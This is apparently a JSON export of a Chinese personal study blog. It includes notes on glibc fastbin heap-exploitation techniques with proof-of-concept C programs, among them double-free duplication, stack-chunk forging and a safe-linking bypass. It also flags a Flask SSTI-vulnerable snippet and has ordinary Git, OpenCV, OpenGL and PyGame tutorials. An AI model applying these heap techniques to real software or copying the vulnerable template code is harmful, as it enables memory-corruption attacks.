


[{"content":"\rFast bin attack #\rWhat\u0026rsquo;s fast bin #\rfastbin被存放在fastbinY数组中，该数组一共有10个元素。\n每个fast bin都是一个单链表，只是使用fd指针。fast bin无论是添加还是移除都是对链表尾进行操作，使用后入先出算法，所以fastbinY数组中每个fastbin元素都存放了该链表的尾结点，尾结点通过fd指针指向前一个结点。\nfastbin size：数组中相同的链表存放的chunk大小相同，并且下标相邻的数组元素中的chunk链表的chunk size相差8字节(就是第一个元素chunk size都是16字节，第二个都是24字节，以此类推)，所以默认情况下大小尾16到80字节的chunk会被分到fast chunk中。\nfastbin 合并：不会对freechunk进行合并操作。因为fastchunk本身就是为了快速存取chunk，所以每一个chunk的P位都是设置为1(表示前一个chunk已使用)。但是当释放的chunk与该chunk相邻的空闲chunk合并后大小大于一定的大小时(FASTBIN_CONSOLIDATION_THRESHOLD),内存碎片可能会比较多，我们就需要把fast bin中的chunk都进行合并。\n用户通过malloc请求的大小如果属于fast chunk的大小范围，而这时fast bin支持的最大内存大小以及所有的fast bin链表都是空的(意思就是fast bin里面没有东西)，所以最开始使用malloc申请内存的时候即使申请的内存大小属于fast chunk的内存大小，它也不会交给fast bin处理，而是交给small bin，如果small bin也为空的话就交给unsorted bin。\n当我们第一次调用malloc(fast bin)的时候，系统执行_int_malloc函数，该函数首先会发现当前fast bin为空，就转交给small bin处理，进而又发现small bin 也为空，就调用malloc_consolidate函数对malloc_state结构体进行初始化，malloc_consolidate函数主要完成以下几个功能：\n首先判断当前malloc_state结构体中的fast bin是否为空，如果为空就说明整个malloc_state都没有完成初始化，需要对malloc_state进行初始化。 malloc_state的初始化操作由函数malloc_init_state(av)完成，该函数先初始化除fast bin之外的所有的bins(构建双链表，详情见后文small bins介绍)，再初始化fast bins。 然后当再次执行malloc(fast chunk)函数的时候，此时fast bin相关数据不为空了，就开始使用fast bin。 free(fast chunk)操作：这个操作很简单，主要分为两步：\n先通过chunksize函数根据传入的地址指针获取该指针对应的chunk的大小； 然后根据这个chunk大小获取该chunk所属的fast bin，然后再将此chunk添加到该fast bin的链尾即可。整个操作都是在_int_free函数中完成。得到第一个来自于fast bin的chunk之后，系统就将该chunk从对应的fast bin中移除，并将其地址返回给用户。 fast bin dup #\rglibc2.23 #\rpoc精简 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); free(a); free(b); free(a); a = malloc(8); b = malloc(8); c = malloc(8); fprintf(stderr, \u0026#34;1st malloc(8): %p\\n\u0026#34;, a); fprintf(stderr, \u0026#34;2nd malloc(8): %p\\n\u0026#34;, b); fprintf(stderr, \u0026#34;3rd malloc(8): %p\\n\u0026#34;, c); assert(a == c); } glibc2.27 - glibc2.39 #\rpoc精简 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { void *ptrs[8]; for (int i=0; i\u0026lt;8; i++) { ptrs[i] = malloc(8); } for (int i=0; i\u0026lt;7; i++) { free(ptrs[i]); } int *a = calloc(1, 8); int *b = calloc(1, 8); int *c = calloc(1, 8); printf(\u0026#34;1st calloc(1, 8): %p\\n\u0026#34;, a); printf(\u0026#34;2nd calloc(1, 8): %p\\n\u0026#34;, b); printf(\u0026#34;3rd calloc(1, 8): %p\\n\u0026#34;, c); free(a); free(b); free(a); a = calloc(1, 8); b = calloc(1, 8); c = calloc(1, 8); printf(\u0026#34;1st calloc(1, 8): %p\\n\u0026#34;, a); printf(\u0026#34;2nd calloc(1, 8): %p\\n\u0026#34;, b); printf(\u0026#34;3rd calloc(1, 8): %p\\n\u0026#34;, c); assert(a == c); } fastbin dup consolidate #\rPOC精简 #\rglibc 2.23 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { printf(\u0026#34;This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\\n\u0026#34;); void* p1 = calloc(1,0x40); printf(\u0026#34;Allocate a fastbin chunk p1=%p \\n\u0026#34;, p1); printf(\u0026#34;Freeing p1 will add it to the fastbin.\\n\\n\u0026#34;); free(p1); void* p3 = malloc(0x400); printf(\u0026#34;a chunk with chunk size 0x410. p3=%p\\n\u0026#34;, p3); assert(p1 == p3); free(p1); // vulnerability void *p4 = malloc(0x400); assert(p4 == p3); printf(\u0026#34;We now have two pointers (p3 and p4) that haven\u0026#39;t been directly freed\\n\u0026#34;); printf(\u0026#34;and both point to the same large-sized chunk. p3=%p p4=%p\\n\u0026#34;, p3, p4); printf(\u0026#34;We have achieved duplication!\\n\\n\u0026#34;); return 0; } glibc 2.27 - glibc 2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; #define CHUNK_SIZE 0x400 int main() { void *ptr[7]; for(int i = 0; i \u0026lt; 7; i++) ptr[i] = malloc(0x40); void* p1 = malloc(0x40); for(int i = 0; i \u0026lt; 7; i++) free(ptr[i]); free(p1); void* p2 = malloc(CHUNK_SIZE); assert(p1 == p2); free(p1); // vulnerability (double free) printf(\u0026#34;It is now in the tcache (or merged with top if we had initially chosen a chunk size \u0026gt; 0x410).\\n\u0026#34;); void *p3 = malloc(CHUNK_SIZE); assert(p3 == p2); printf(\u0026#34;and both point to the same tcache sized chunk. p2=%p p3=%p\\n\u0026#34;, p2, p3); return 0; } fastbin dup into stack #\rPOC精简 #\rglibc 2.23 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { unsigned long long stack_var; fprintf(stderr, \u0026#34;The address we want malloc() to return is %p.\\n\u0026#34;, 8+(char *)\u0026amp;stack_var); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, \u0026#34;1st malloc(8): %p\\n\u0026#34;, a); fprintf(stderr, \u0026#34;2nd malloc(8): %p\\n\u0026#34;, b); fprintf(stderr, \u0026#34;3rd malloc(8): %p\\n\u0026#34;, c); free(a); free(b); free(a); unsigned long long *d = malloc(8); fprintf(stderr, \u0026#34;1st malloc(8): %p\\n\u0026#34;, d); fprintf(stderr, \u0026#34;2nd malloc(8): %p\\n\u0026#34;, malloc(8)); stack_var = 0x20; *d = (unsigned long long) (((char*)\u0026amp;stack_var) - sizeof(d)); fprintf(stderr, \u0026#34;3rd malloc(8): %p, putting the stack address on the free list\\n\u0026#34;, malloc(8)); fprintf(stderr, \u0026#34;4th malloc(8): %p\\n\u0026#34;, malloc(8)); } glibc 2.27 - glibc 2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { void *ptrs[7]; for (int i=0; i\u0026lt;7; i++) { ptrs[i] = malloc(8); } for (int i=0; i\u0026lt;7; i++) { free(ptrs[i]); } unsigned long long stack_var; int *a = calloc(1,8); int *b = calloc(1,8); int *c = calloc(1,8); fprintf(stderr, \u0026#34;1st calloc(1,8): %p\\n\u0026#34;, a); fprintf(stderr, \u0026#34;2nd calloc(1,8): %p\\n\u0026#34;, b); fprintf(stderr, \u0026#34;3rd calloc(1,8): %p\\n\u0026#34;, c); free(a); free(b); free(a); unsigned long long *d = calloc(1,8); fprintf(stderr, \u0026#34;1st calloc(1,8): %p\\n\u0026#34;, d); fprintf(stderr, \u0026#34;2nd calloc(1,8): %p\\n\u0026#34;, calloc(1,8)); stack_var = 0x20; *d = (unsigned long long) (((char*)\u0026amp;stack_var) - sizeof(d) - 1); //注意对齐 fprintf(stderr, \u0026#34;3rd calloc(1,8): %p, putting the stack address on the free list\\n\u0026#34;, calloc(1,8)); void *p = calloc(1,8); fprintf(stderr, \u0026#34;4th calloc(1,8): %p\\n\u0026#34;, p); // assert((long)__builtin_return_address(0) == *(long *)p); } fastbin_reverse_into_tcache #\r知识点 #\rlibc 2.32以上tache 和fastbin 会有地址加密 程序每当从fastbin/small bin中取出一个堆块，会尝试把该bin中剩余的堆块拿出来去填充tcache。 POC #\rglibc 2.27 - glibc 2.31 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;assert.h\u0026gt; const size_t allocsize = 0x40; int main(){ setbuf(stdout, NULL); char* ptrs[14]; size_t i; for (i = 0; i \u0026lt; 14; i++) { ptrs[i] = malloc(allocsize); } for (i = 0; i \u0026lt; 7; i++) { free(ptrs[i]); } char* victim = ptrs[7]; free(victim); for (i = 8; i \u0026lt; 14; i++) { free(ptrs[i]); } size_t stack_var[6]; memset(stack_var, 0xcd, sizeof(stack_var)); *(size_t**)victim = \u0026amp;stack_var[0]; // Empty tcache. for (i = 0; i \u0026lt; 7; i++) { ptrs[i] = malloc(allocsize); } for (i = 0; i \u0026lt; 6; i++) { printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); } malloc(allocsize); for (i = 0; i \u0026lt; 6; i++) { printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); } char *q = malloc(allocsize); printf( \u0026#34;\\n\u0026#34; \u0026#34;Finally, if we malloc one more time then we get the stack address back: %p\\n\u0026#34;, q ); assert(q == (char *)\u0026amp;stack_var[2]); return 0; } glibc 2.32 - glibc 2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;assert.h\u0026gt; const size_t allocsize = 0x40; int main(){ setbuf(stdout, NULL); // Allocate 14 times so that we can free later. char* ptrs[14]; size_t i; for (i = 0; i \u0026lt; 14; i++) { ptrs[i] = malloc(allocsize); } // Fill the tcache. for (i = 0; i \u0026lt; 7; i++) free(ptrs[i]); char* victim = ptrs[7]; free(victim); for (i = 8; i \u0026lt; 14; i++) free(ptrs[i]); size_t stack_var[6]; memset(stack_var, 0xcd, sizeof(stack_var)); *(size_t**)victim = (size_t*)((long)\u0026amp;stack_var[0] ^ ((long)victim \u0026gt;\u0026gt; 12)); for (i = 0; i \u0026lt; 7; i++) ptrs[i] = malloc(allocsize); for (i = 0; i \u0026lt; 6; i++) printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); malloc(allocsize); for (i = 0; i \u0026lt; 6; i++) printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); char *q = malloc(allocsize); printf(\u0026#34;\\n\u0026#34; \u0026#34;Finally, if we malloc one more time then we get the stack address back: %p\\n\u0026#34;, q); assert(q == (char *)\u0026amp;stack_var[2]); return 0; } ","date":"2025 年 5 月 22 日","externalUrl":null,"permalink":"/posts/pwn/heap/fastbin_attack/","section":"我的文档","summary":"","title":"Fast bin attack","type":"posts"},{"content":"\rFlask #\r安装Flask #\rpip install flask run() #\rapp.run(host=\u0026#39;127.0.0.1\u0026#39;, port=5000, debug=False) host：指定监听的主机地址。默认\n127.0.0.1 仅允许本机访问；设置为\n0.0.0.0 port：绑定端口号，默认5000。若端口冲突需手动修改（如\nport=8000 debug：调试模式开关。\ndebug=True debug #\r我们可以使用debug，方便调试。这样就不用每次运行app.py文件，可以直接修改，不然每次修改app.py都要重新运行。\nif __name__ == \u0026#39;__main__\u0026#39;: app.debug = True app.run() app.run(debug=True) #相同效果。 装饰器 #\rroute #\r使用route（）装饰器告诉Flask什么样的URL能触发我们的函数.route（）装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数。\n@app.route(\u0026#39;/\u0026#39;) def test()\u0026#34; return 123 设置动态网址\n@app.route(\u0026#34;/hello/\u0026lt;name\u0026gt;\u0026#34;) def hello_user(name): return \u0026#34;user:%s\u0026#34;%name 转化器\n@app.route(\u0026#39;/hello/\u0026lt;int:id\u0026gt;\u0026#39;) def show_post(id): return \u0026#39;%d\u0026#39; %id int 接受整数 float 接受浮点数 path 默认 methods 设置请求方式 #\r通过methods参数定义支持的HTTP方法，默认仅处理GET请求：\n@app.route(\u0026#39;/submit\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def submit_form(): if request.method == \u0026#39;POST\u0026#39;: return \u0026#34;表单已提交\u0026#34; return \u0026#34;显示表单页面\u0026#34; 模板渲染 #\rrender_template() #\r#app.py from flask import Flask, render_template app = Flask(__name__, template_folder=\u0026#39;custom_templates\u0026#39;) @app.route(\u0026#39;/\u0026#39;) def index(): user = {\u0026#39;name\u0026#39;: \u0026#39;Admin\u0026#39;}#传入一个字典数组 return render_template(\u0026#34;index.html\u0026#34;,title=\u0026#39;Home\u0026#39;,user=user) if __name__ == \u0026#39;__main__\u0026#39;: app.debug = True app.run() 自定义模块路径 ：Flask中 template_folder ，默认路径：templates index.html \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;{{title}}\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello, {{user.name}}!\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; render_template_string() #\rdef test(): template = \u0026#39;\u0026#39;\u0026#39; \u0026lt;div class=\u0026#34;center-content error\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Oops! That page doesn\u0026#39;t exist.\u0026lt;/h1\u0026gt; \u0026lt;h3\u0026gt;%s\u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026#39;\u0026#39;\u0026#39; %(request.url) #SSTI 注入 request #\rrequest.url #\r返回客户端请求的完整URL\nrequest.url #http://localhost:5000/user?id=1 request.args #\r获取URL查询参数（即?key=value格式），返回ImmutableMultiDict对\n# 访问 /search?q=flask\u0026amp;name=hhhh search_term = request.args.get(\u0026#39;q\u0026#39;) name = request.args.name request.form #\r获取表单提交的POST数据（Content-Type为application/x-www-form-urlencoded或multipart/form-data）\n@app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def login(): username = request.form.get(\u0026#39;username\u0026#39;) # request.form.username password = request.form.get(\u0026#39;password\u0026#39;) request.values #\r统一参数获取 request.values 是 ImmutableMultiDict 类型的对象，合并了以下两类数据：\nrequest.args 通过 URL 查询字符串传递的参数（如 /submit?name=John\u0026amp;age=20 request.form：通过 POST 请求的表单数据（如 \u0026lt;form method=\u0026quot;post\u0026quot;\u0026gt; 中的输入字段 @app.route(\u0026#39;/login\u0026#39;) def login(): username = request.values.get(\u0026#39;username\u0026#39;) # request.values.username request.json/request.get_json() #\r解析JSON格式的请求体（Content-Type需为application/json）\ndata = request.get_json() user_id = data.get(\u0026#39;user_id\u0026#39;) request.cookies #\r","date":"2025 年 5 月 22 日","externalUrl":null,"permalink":"/posts/python/flask/","section":"我的文档","summary":"","title":"Flask","type":"posts"},{"content":"\rGit基础 #\rgit的工作区域和文件状态 #\r工作区域 #\rgraph LR\rA[工作区]--\u003e|git add| B[暂存区]\rB --\u003e|git commit| C[本地仓库]\r工作区：当前项目的文件目录，是开发者直接编辑代码的地方。 暂存区：用于临时存放即将提交的改动。 本地仓库：存储项目完整历史和元数据的数据库（位于 .git 目录中）。 文件状态 #\rgraph LR\rA[未跟踪]--\u003e|git add| B[未修改]\rB --\u003e C[已修改]\rC --\u003e|git add| D[已暂存]\rA --\u003e|git add| D\rD --\u003e|git commit| B\rB --\u003e|git rm| A\rD --\u003e|git reset| C\rC --\u003e|git checkout| B\rUntrack（未跟踪） Unmodified (未修改) Modified (已修改) Staged (已暂存) 基本命令 #\rgit config 配置信息 #\r参数 #\r无 本地仓库有效。\n--global 全局配置，所有仓库生效。\ngit config --global user.name \u0026#34;name\u0026#34; git config --global user.name \u0026#34;exp@qq.com\u0026#34; --system 系统配置，对所有用户生效。\n--list 列出配置信息。\ngit config --system --list git config --global --list git config --list git init 创建仓库 #\rgit init #在当前目录创建 git init my_test #在my_test目录创建 **注意: ** 删除 .git 文件后，就删除了仓库。\ngit status 查看仓库状态 #\r参数 #\r-s 简略查看 git add 添加至暂存区 #\rgit add \u0026lt;file\u0026gt; git add * git commit 提交 #\r参数 #\r-a 同时暂存并提交\n-m 指定提交信息。\ngit commit -m \u0026#34;Message\u0026#34; 无参数 会使用vim 让你在开头输入提交信息。\ngit log 查看历史提交记录 #\r参数 #\r--oneline 查看简洁提交记录。 git ls-files 列出 Git 跟踪的文件 #\r显示 Git 仓库中已跟踪文件的列表，包括已修改、已暂存和已提交的文件。\ngit reset 版本回退 #\r参数 #\r--soft 保留工作区和暂存区。 --hard 不保留工作区和暂存区。 --mixed只保留工作区(默认)。 git reset --soft ID 查看图形化结构 #\rgit log --oneline --graph --decorate --all --hard 误操作回退 #\rgit reflog 查看操作历史记录 #\rgit reflog #查看操作历史记录,找到操作的ID git reset --hard ID # 使用git reset回退 git diff 比较差异 #\r信息格式 #\rdiff --git a/2.txt b/2.txt index 00b30ed..d1019e1 100644 #index 后是文件hash，10644为权限 Binary files a/2.txt and b/2.txt differ 参数 #\r无 比较工作区和暂存区差异\ngit diff HEAD 比较版本库和工作区的差异\ngit diff HEAD --cached 比较暂存区和版本库的差异\ngit diff --cached --staged和--cached 一样\n比较两个版本差异\ngit diff \u0026lt;ID 1\u0026gt; \u0026lt;ID 2\u0026gt; #两个版本比较 git diff \u0026lt;ID\u0026gt; HEAD #和HEAD比较 git diff HEAD HEAD~ #当前版本和上一个版本 git diff HEAD HEAD~2#当前版本和上上个版本 一次类推 比较文件内容\ngit diff HEAD HEAD~ \u0026lt;filename\u0026gt; 比较分支\ngit diff \u0026lt;branch_name\u0026gt; \u0026lt;branch_name\u0026gt; git rm #\r参数 #\r无 同时删除暂存区和工作区\ngit rm \u0026lt;filename\u0026gt; --cached 从暂存区删除，保留工作区\ngit rm --cached \u0026lt;filename\u0026gt; -r 递归删除\ngit rm -r * **注意: ** 删除后记得提交。\n其他删除方法 #\rrm \u0026lt;filename\u0026gt; #先删除工作区 git add \u0026lt;filename\u0026gt; #在删除暂存区 .gitignore 忽略文件 #\r将不被管理的文件名，写入.gitignore文件中，使其不被git管理。\nvim .gitignore #可使用标准Blob模式匹配 --- err.log #忽略err.log 文件 *.txt #忽略所有.txt文件 test/ #忽略test文件夹 /test #忽略test文件夹下的文件，不忽略test 匹配规则 #\r空行和#开头会忽略 可使用标准Blob模式匹配 如：* ? [abc] git clone 拉去文件 #\rgit clone address git push 更新远程仓库 #\rgit push \u0026lt;remote\u0026gt; 参数 #\r-u 添加远程仓库\ngit push \u0026lt;远程仓库名\u0026gt; \u0026lt;分支名\u0026gt; git pull 拉取远程仓库 #\rgit pull \u0026lt;远程仓库名\u0026gt; \u0026lt;远程分支名\u0026gt;:\u0026lt;本地分支名\u0026gt;#相同可省略 git remote #\r参数 #\radd 添加远程仓库\ngit remote add \u0026lt;远程仓库名\u0026gt; \u0026lt;远程仓库地址\u0026gt; -v 查看远程仓库\ngit remote -v rm 删除远程仓库\ngit remote rm origin set-url 重新设置远程厂库\ngit remote set-url origin https://gitee.com/xx/xx.git (新地址) git branch #\r用法 #\r查看分支列表\ngit branch 创建分支\ngit branch \u0026lt;branch-name\u0026gt; 删除分支\ngit branch -d \u0026lt;branch-name\u0026gt; #删除已合并 git branch -D \u0026lt;branch-name\u0026gt; #删除未合并 git switch 切换分支 #\rgit switch \u0026lt;branch-name\u0026gt; git merge #\r用法 #\r合并分支\ngit merge \u0026lt;branch-name\u0026gt; ​\t注意：git merge合并分支必须在\n终止合并\ngit merge --abort 分支合并冲突处理 #\r手动修改冲突文件，合并冲突内容 然后将该文件添加至暂存区 提交修改 不想继续合并可以使用终止合并的命令。\n优缺点 #\r优点： 不会破坏分支的提交历史，方便回溯和查看。\n缺点：会产生额外的提交节点，分支图比较复杂。.\ngit rebase #\r优缺点 #\r**优点：**不会新增额外提交记录，形成线性历史，比较直观\n**缺点：**会改变提交历史，改变当前分支branch out的节点，比卖在共享分支使用。\nGit 工作流模型 #\rGitFlow #\rGitHubFlow #\r","date":"2025 年 5 月 22 日","externalUrl":null,"permalink":"/posts/git/git%E5%9F%BA%E7%A1%80/","section":"我的文档","summary":"","title":"Git","type":"posts"},{"content":"\rOpenCV模块 #\rOpenCV安装 #\rpip install opencv-python 图像基础处理 #\rcv2.imread()读取图像 #\r参数： #\rfilename（必填，字符串）：图像路径（支持中文路径需使用 cv2.imdecode） flags（可选，整数）：读取模式，默认 cv2.IMREAD_COLOR（彩色图） cv2.IMREAD_COLOR 或 1：加载彩色图（忽略透明度） cv2.IMREAD_GRAYSCALE 或 0：加载灰度图 cv2.IMREAD_UNCHANGED 或 -1：保留 Alpha 通道（如 PNG 透明背景） img = cv2.imread(\u0026#39;image.jpg\u0026#39;) 返回值： #\rnumpy.ndarray：成功返回图像数据（Numpy数组），失败返回 None cv2.imshow() 显示图像 #\r参数： #\rwinname（必填，字符串）：窗口名称，需唯一标识 mat（必填，numpy.ndarray）：要显示的图像数据（BGR或灰度格式） cv2.imshow(\u0026#34;show\u0026#34;, image) #窗口标签，要显示图像的类 cv2.waitKey() 等待键盘输入 #\r参数： #\rdelay（可选，整数）：等待时间（毫秒），默认 0 表示无限等待 cv2.imwrite(0) #无限等待 返回值： #\r按键 ASCII 码：若按下按键则返回对应 ASCII 值（如 q 返回 113） -1：超时未按键 cv2.destroyAllWindows() 关闭所有窗口 #\rcv2.destroyAllWindows() cv2.destroyWindow() 关闭指定窗口 #\r参数: #\rwinname（必填，字符串类型） 需要关闭的窗口名称，必须与创建窗口时通过 cv2.imshow() 或 cv2.namedWindow() 设置的名称完全一致（区分大小写和特殊字符） cv2.destroyWindow(\u0026#34;show\u0026#34;) cv2.imwrite() 保存图像 #\r参数： #\rfilename（必填，字符串）：保存路径（需包含扩展名如 .jpg） img（必填，numpy.ndarray）：图像数据（支持8位/16位单通道或3通道BGR格式） params（可选，列表/元组）：保存参数，如压缩质量 JPEG：[cv2.IMWRITE_JPEG_QUALITY, 95]（质量0-100） PNG：[cv2.IMWRITE_PNG_COMPRESSION, 3]（压缩级别0-9） cv2.cvtColor() 图像颜色空间转换 #\r参数： #\rsrc：输入图像（支持 uint8、float32 等数据类型）。 code：颜色转换代码（如 cv2.COLOR_BGR2GRAY）。 dstCn：输出图像通道数（默认 0，自动推断）。 BGR 转灰度（文档扫描/人脸检测）\nimport cv2 gray_img = cv2.cvtColor(bgr_img, cv2.COLOR_BGR2GRAY) BGR 转 HSV（颜色追踪/分割）\nhsv_img = cv2.cvtColor(bgr_img, cv2.COLOR_BGR2HSV) lower_red = np.array([0, 50, 50]) upper_red = np.array([10, 255, 255]) mask = cv2.inRange(hsv_img, lower_red, upper_red) BGR 转 RGB（可视化兼容性）\nrgb_img = cv2.cvtColor(bgr_img, cv2.COLOR_BGR2RGB) plt.imshow(rgb_img) #Matplotlib 显示需 RGB 格式 BGR 转 Lab（色域分析）\nlab_img = cv2.cvtColor(bgr_img, cv2.COLOR_BGR2Lab) 获取图像基本信息 #\rimg.shape #\r返回一个元组 (height, width, channels)： 高度（height）：图像垂直方向像素数，对应 shape[0] 宽度（width）：图像水平方向像素数，对应 shape[1] 通道数（channels）：彩色图为 3（BGR 三通道），灰度图为 1 import cv2 img = cv2.imread(\u0026#34;image.jpg\u0026#34;) height, width, channels = img.shape 图像算术运算 #\rcv2.add() 图像加法 #\rcv2.subtract() 图像减法 #\rcv2.multiply() 图像乘法 #\rcv2.divide() 图像除法 #\rcv2.bitwise_and() 图像与运算 #\rcv2.bitwise_or() 图像或运算 #\rcv2.bitwise_not() 图像非运算 #\rcv2.bitwise_xor() 图像异或运算 #\r创建黑白图片的方法 #\r使用numpy #\r灰度图（单通道） #\rimport numpy as np gray_img = np.zeros((480, 640), dtype=np.uint8) #黑 gray_img = np.full((480, 640), fill_value=255,dtype=np.uint8) #白 彩色图RGB #\rimport numpy as np color_img = np.zeros((480, 640, 3), dtype=np.uint8) #黑 color_img = np.full((480, 640, 3), fill_value=255,dtype=np.uint8) #白 ","date":"2025 年 5 月 22 日","externalUrl":null,"permalink":"/posts/python/opencv/","section":"我的文档","summary":"","title":"OpenCV","type":"posts"},{"content":"\ropenGL #\r基本使用 #\r导入 #\rfrom OpenGL.GL import * from OpenGL.GLU import * gluPerspective() #\r调用 gluPerspective 来描述我们在场景中的视角。\n实例：\ngluPerspective(45, 1, 0.1, 50.0) #45: 视线角度为45 #1: 视口的宽高比（aspect ratio）。这里宽高比为 1，意味着视口的宽度和高度相等。通常，这个值应该设置为视口的实际宽度除以高度。 #0.1: 近裁剪面的距离。任何距离相机小于这个值的物体都将被裁剪掉，不会显示在屏幕上。 #50.0: 远裁剪面的距离。任何距离相机大于这个值的物体都将被裁剪掉，不会显示在屏幕上。 glTranslatef() #\r用于对当前的模型视图矩阵进行平移变换。平移变换可以将物体在三维空间中沿着指定的方向移动。\n实例：\nglTranslatef(0.0, 0.0, -5) #0.0：表示在 X 轴方向上的平移量。这里设置为 0，意味着在 X 轴方向上不进行平移。 #0.0：表示在 Y 轴方向上的平移量。这里设置为 0，意味着在 Y 轴方向上不进行平移。 #-5：表示在 Z 轴方向上的平移量。由于 OpenGL 采用右手坐标系，Z 轴正方向指向屏幕外，负方向指向屏幕内，所以这里将物体沿着 Z 轴负方向平移 5 个单位，相当于将物体向屏幕内移动 5 个单位，从而使物体离相机更远。 glRotatef() #\r用于改变我们观察场景的角度。调用 glRotatef(theta, x, y, z)会将整个场景围绕向量(x, y, z)指定的轴旋转角度 theta。\n实例：\nglRotatef(30, 0, 0, 1) #绕z轴 30° glEnable() #\r用于启用特定的 OpenGL 功能。\n实例：\nglEnable(GL_CULL_FACE); #GL_CULL_FACE，表示面剔除功能。面剔除是一种优化技术，用于剔除那些背对相机的面，从而减少不必要的渲染计算。 glEnable(GL_DEPTH_TEST); #GL_DEPTH_TEST，表示深度测试功能。深度测试是一种用于确定哪些物体应该显示在前面，哪些物体应该显示在后面的技术。确保渲染离我们最近的多边形 glCullFace() #\r用于指定要剔除的面的类型。\n实例：\nglCullFace(GL_BACK); #GL_BACK：表示要剔除的面是背对相机的面。 glClear() #\r主要作用是清除指定的缓冲区，将缓冲区中的数据重置为默认值。在 OpenGL 里，有多种类型的缓冲区，如颜色缓冲区、深度缓冲区、模板缓冲区等，每个缓冲区都存储着不同类型的信息。\n缓冲区标志 #\r1. GL_COLOR_BUFFER_BIT #\r含义：清除颜色缓冲区。颜色缓冲区存储着屏幕上每个像素的颜色信息，清除该缓冲区会将所有像素的颜色设置为之前通过 glClearColor 函数指定的清除颜色。默认的清除颜色是黑色（RGB 值为 (0.0, 0.0, 0.0)），透明度为 1.0。 示例代码： // 设置清除颜色为红色 glClearColor(1.0, 0.0, 0.0, 1.0); // 清除颜色缓冲区 glClear(GL_COLOR_BUFFER_BIT); 2. GL_DEPTH_BUFFER_BIT #\r含义：清除深度缓冲区。深度缓冲区用于记录每个像素的深度值（即离相机的距离），清除该缓冲区会将所有像素的深度值设置为之前通过 glClearDepth 函数指定的清除深度值。默认的清除深度值是 1.0。 示例代码： // 设置清除深度值为 1.0 glClearDepth(1.0); // 清除深度缓冲区 glClear(GL_DEPTH_BUFFER_BIT); 3. GL_STENCIL_BUFFER_BIT #\r含义：清除模板缓冲区。模板缓冲区用于实现一些特殊的渲染效果，如裁剪、遮罩等。清除模板缓冲区会将所有像素的模板值设置为之前通过 glClearStencil 函数指定的清除模板值。默认的清除模板值是 0。\n示例代码：\n// 设置清除模板值为 0 glClearStencil(0); // 清除模板缓冲区 glClear(GL_STENCIL_BUFFER_BIT); 使用按位或运算符 | 组合多个缓冲区标志，一次性清除多个缓冲区。例如，同时清除颜色缓冲区和深度缓冲区：\nglBegin()\u0026amp;glEnd() #\r用于定义图元（基本图形元素）的函数对。\nglBegin 函数用于开始定义一组图元，而 glEnd 函数用于结束这组图元的定义。\n在 glBegin 和 glEnd 之间，可以使用 glVertex 等函数来指定图元的顶点信息。\n实例：\nglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); # 开始定义三角形图元 glBegin(GL_TRIANGLES); # 指定第一个三角形的三个顶点 glColor3f(1.0, 0.0, 0.0); # 设置颜色为红色 glVertex3f(-0.5, -0.5, 0.0); glVertex3f(0.5, -0.5, 0.0); glVertex3f(0.0, 0.5, 0.0); # 结束定义三角形图元 glEnd(); # 刷新缓冲区，将绘制结果显示到屏幕上 glFlush(); glVertex #\rglVertex3f #\r用于指定三维顶点坐标的函数\nglVertex3f(x, y, z); glVertex3fv #\r用于指定三维顶点坐标的函数\nv = (1,2,3) glVertex3fv(v); glColor #\r用于指定当前绘图颜色，后续使用 OpenGL 进行图形绘制（如绘制点、线、多边形等）时，就会使用这个设置好的颜色。\nglColor3f() #\r用于指定当前绘图颜色\n# 设置绘图颜色为红色 glColor3f(1.0, 0.0, 0.0) glColor3fv() #\r用于指定当前绘图颜色\nrgb = (1,0,0) glColor3fv(v); ","date":"2025 年 5 月 22 日","externalUrl":null,"permalink":"/posts/python/opengl/","section":"我的文档","summary":"","title":"openGL","type":"posts"},{"content":"\rPyGame #\r基础使用 #\r导入 #\rimport pygame pygame.init() #\r初始化\npygame.init() pygame.display.set_mode() #\rpygame.display.set_mode(size,flags) #size 二元元组，代表宽和高 #flags 使用一些特性 #如果不用什么特性，就指定0 # 0 用户设置的窗口大小 # pygame.FULLSCREEN 创建一个全屏窗口 # pygame.HWSURFACE 如果想创建一个硬件显示（surface会存放在显存里，从而有着更高的速度）， # pygame.OPENGL 创建一个OPENGL渲染的窗口 # pygame.RESIZABLE 创建一个可以改变大小的窗口: # pygame.NOFRAME 